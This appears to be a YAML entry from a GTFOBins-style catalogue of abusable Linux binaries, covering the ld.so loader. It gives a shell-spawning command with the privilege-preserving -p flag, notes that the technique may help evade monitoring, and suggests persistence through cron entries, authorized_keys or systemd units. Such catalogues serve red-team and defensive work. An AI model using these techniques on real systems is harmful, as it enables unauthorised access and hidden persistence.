---
name: ld.so
capabilities:
- exec
- spawn
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: |-
    `ld.so` is the Linux dynamic linker/loader, its filename and location might change across distributions (e.g., `/lib64/ld-linux-x86-64.so.2`). The actual path is can be obtained with:

    ```
    strings /proc/self/exe | head -1
    ```
persistence_potential: true
examples:
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: /path/to/ld.so /bin/sh -p
  notes: The spawned process will be the loader, not the target executable, this might aid evasion. See <https://shyft.us/posts/20230526_linux_command_proxy.html> for more information.
references:
- https://gtfobins.github.io/gtfobins/ld.so/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
